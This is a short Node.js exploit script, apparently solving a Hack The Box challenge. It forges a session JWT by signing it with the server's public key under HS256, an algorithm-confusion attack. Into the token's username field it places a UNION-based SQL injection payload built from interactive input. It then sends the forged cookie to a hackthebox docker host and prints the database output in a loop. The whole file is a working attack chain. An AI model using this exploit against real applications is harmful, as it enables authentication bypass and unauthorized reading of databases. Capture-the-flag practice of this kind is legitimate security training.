#!/usr/bin/env nodejs

const jwt = require('jsonwebtoken');
const fs = require('fs');
const request = require('request');
const cheerio = require('cheerio');

const myprompt = require('prompt-sync')();

const pub_key = fs.readFileSync('./public.key', 'utf8');

function try_harder() {
    const username = myprompt('Username: ');
    if (username == 'exit') {
        process.exit(1);
    }
    data = {
        username: `' union select 1,(${username}),3 -- +`
    };
    data = Object.assign(data, {
        pk: pub_key
    });
    encrypted = jwt.sign(data, pub_key, {
        algorithm: 'HS256'
    });
    let jar = request.jar();
    let cookie = request.cookie(`session=${encrypted}`);
    jar.setCookie(cookie, 'http://docker.hackthebox.eu', function(err, cookie) {
        if (err) {
            console.log(err);
        }
    });
    request({
        uri: "http://docker.hackthebox.eu:30548",
        method: "GET",
        jar: jar
    }, function(err, resp, body) {
        if (err) {
            console.log("error:", err);
        }
        const dom = cheerio.load(body);
        const output = dom('div[class=card-body]').text();
        if (output) {
            console.log(output);
        } else {
            console.log(body);
        }
        try_harder();
    });
}

try_harder();
